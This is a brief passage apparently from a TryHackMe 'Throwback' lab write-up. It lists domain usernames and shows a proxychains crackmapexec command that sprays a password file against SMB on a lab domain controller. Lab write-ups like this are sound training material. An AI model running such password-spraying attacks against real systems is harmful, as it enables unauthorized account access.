...
```console
-bibo318@parrot:~/THM/throwback$ cat dc01users.txt 
ClemonsD
DunlopM
LoganF
IbarraA
...
```console
bibo318@parrot:~/THM/throwback$ proxychains crackmapexec smb 10.200.11.117 -u dc01users.txt -d THROWBACK -p pass.txt 
.
.
